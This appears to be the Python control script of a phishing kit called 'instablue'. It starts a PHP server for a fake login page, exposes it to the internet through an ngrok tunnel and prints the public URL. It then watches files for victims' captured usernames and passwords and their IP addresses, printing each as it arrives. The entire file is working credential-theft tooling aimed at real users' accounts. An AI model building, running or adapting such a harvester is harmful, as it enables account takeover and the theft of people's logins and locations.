import os
import json
import time
import sys
import banner
from colorama import Fore,Style
from subprocess import Popen
from pyngrok import ngrok
o = open("./instablue/ip.txt","w")
ab = o.write("")
o.close()
file_op = open("./instablue/user.json","w")
hajm_file = file_op.write("")
file_op.close()
stat_file = 0
def file():
  try:
    def server():
      with open("phpserver","w") as phplog:
          Popen(("php","-S","localhost:8080","-t","./instablue"),stderr=phplog,stdout=phplog)
    server()
    url = ngrok.connect("8080","http").replace("http","https")
    os.system("clear")
    time.sleep(3)
    banner.baner()
    time.sleep(0.1)
    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"!"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.YELLOW+"Please Wait . . . !\n")
    time.sleep(3)
    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTGREEN_EX+"Runing PHP server . . . !\n")
    time.sleep(2)
    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.RED+"Runing ngrok . . . !\n")
    time.sleep(1)
    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.GREEN+"Your URL"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+url+Style.RESET_ALL+"\n")
    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"-"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Waiting for Login Info,"+Fore.LIGHTRED_EX+" Ctrl + C "+Fore.LIGHTYELLOW_EX+"to exit . . . !\n")
    def info():
        global stat_file
        if not str(os.stat("./instablue/user.json").st_size) == stat_file:
            stat_file = str(os.stat("./instablue/user.json").st_size)
            files = open("./instablue/user.json","r")
            hajm_file = files.read()
            try:
                infor = json.loads(hajm_file)
                for vlu in infor['dev']:
                    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Username"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+vlu["username"])
                    print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Password"+Fore.LIGHTBLUE_EX+" : >> "+Style.BRIGHT+Fore.LIGHTCYAN_EX+vlu["password"])
                    file_op = open("./instablue/user.json","w")
                    hajm_file = file_op.write("")
                    file_op.close()
            except:
             print("  ")
    def getip():
      global stat_file
      if not str(os.stat("./instablue/ip.txt").st_size) == stat_file:
        stat_file = str(os.stat("./instablue/ip.txt").st_size)
        files = open("./instablue/ip.txt","r")
        i = files.readlines()
        try:
          i = i[-1]
          print(Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTYELLOW_EX+"Target Entered Link :) \n"+Fore.LIGHTRED_EX+" ["+Style.BRIGHT+Fore.WHITE+"+"+Style.RESET_ALL+Fore.LIGHTRED_EX+"] "+Fore.LIGHTCYAN_EX+"Target IP : %s"%(i))
          o = open("./instablue/ip.txt","w")
          ab = o.write("")
          o.close()
        except:
          print(" ")
    while True:
        info()
        getip()
  except:
    os.system("pkill php")
    print(Fore.LIGHTCYAN_EX+"\n [✓] Exit :)")